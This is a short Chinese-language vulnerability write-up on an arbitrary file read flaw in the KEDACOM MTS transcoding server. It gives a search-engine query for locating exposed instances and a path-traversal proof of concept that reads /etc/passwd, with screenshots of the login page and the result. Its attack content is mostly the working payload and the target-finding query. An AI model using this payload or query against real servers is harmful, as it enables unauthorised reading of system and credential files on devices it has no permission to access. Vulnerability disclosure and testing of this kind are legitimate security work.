# 科达 MTS转码服务器 任意文件读取漏洞

## 漏洞描述

KEDACOM MTS转码服务器存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息

## 漏洞影响

```
MTS转码服务器
```

## 网络测绘

```
app="MTS转码服务器"
```

## 漏洞复现

登录页面

![image-20220525145422524](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115903650.png)

验证POC

```
/../../../../../../../../etc/passwd
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326115903651.png)